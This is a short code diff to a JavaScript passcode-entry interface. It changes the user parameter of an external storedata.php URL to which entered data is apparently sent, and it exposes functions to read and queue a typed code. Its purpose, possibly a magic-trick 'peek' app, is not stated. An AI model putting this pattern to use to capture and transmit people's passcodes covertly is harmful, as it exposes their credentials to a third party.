@@ -1,5 +1,5 @@
 (() => {
-  const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarunpeek&data=";
+  const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarun&data=";
   const MAX = 4;
   let code = "";
 
@@ -449,3 +449,4 @@
   window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };
 
 })();
+
